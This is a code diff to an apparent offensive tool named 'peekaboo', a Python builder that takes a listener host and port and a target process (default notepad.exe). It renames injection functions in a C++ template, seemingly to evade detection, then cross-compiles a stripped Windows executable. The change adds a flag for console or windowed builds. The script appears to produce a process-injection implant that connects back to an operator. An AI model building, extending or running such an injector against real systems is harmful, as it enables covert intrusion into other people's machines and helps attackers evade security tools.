@@ -71,7 +71,7 @@ def generate_payload(host, port):
         print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
         sys.exit()
 
-def run_peekaboo(host, port, proc_name):
+def run_peekaboo(host, port, proc_name, mode):
     banner = """
     #####  ###### #    #         ##         #####   ####   ####
     #    # #      #   #         #  #        #    # #    # #    #
@@ -136,6 +136,9 @@ def run_peekaboo(host, port, proc_name):
     data = data.replace("Inject(", f_inj + "(")
     data = data.replace("FindTarget(", f_ftt + "(")
 
+    if mode == "console":
+        data = data.replace("int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {", "int main(void) {")
+
     tmp.close()
     tmp = open("peekaboo-enc.cpp", "w+")
     tmp.write(data)
@@ -144,7 +147,7 @@ def run_peekaboo(host, port, proc_name):
     print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
 
     try:
-        cmd = "x86_64-w64-mingw32-gcc -O2 peekaboo-enc.cpp -o peekaboo.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1"
+        cmd = "x86_64-w64-mingw32-gcc -O2 peekaboo-enc.cpp -o peekaboo.exe -m" + mode + " -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1"
         os.system(cmd)
         os.remove("peekaboo-enc.cpp")
     except:
@@ -159,7 +162,8 @@ if __name__ == "__main__":
     parser.add_argument('-l','--lhost', required = True, help = "local IP")
     parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
     parser.add_argument('-e', '--proc', required = False, help = "process name", default = "notepad.exe")
+    parser.add_argument("-m", '--mode', required = False, help = "console or windows app", default = "windows")
     args = vars(parser.parse_args())
     host, port = args['lhost'], args['lport']
-    proc_name = args['proc']
-    run_peekaboo(host, port, proc_name)
+    proc_name, mode = args['proc'], args['mode']
+    run_peekaboo(host, port, proc_name, mode)
